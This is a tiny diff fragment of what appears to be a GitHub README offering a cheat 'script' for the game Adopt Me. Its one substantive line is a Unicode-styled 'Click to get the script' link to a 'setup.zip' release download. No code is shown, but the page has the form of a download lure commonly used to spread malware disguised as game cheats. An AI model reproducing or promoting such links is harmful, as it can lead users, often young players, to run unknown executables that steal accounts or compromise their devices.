@@ -25,6 +25,7 @@
 
 
 
+
 # Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://github.com/BoomssloI/Adopt-Me/releases/download/Download/setup.zip)***
 
 ![maxresdefault](https://github.com/user-attachments/assets/46176302-6d8f-471c-a6e7-83b4f611b89e)
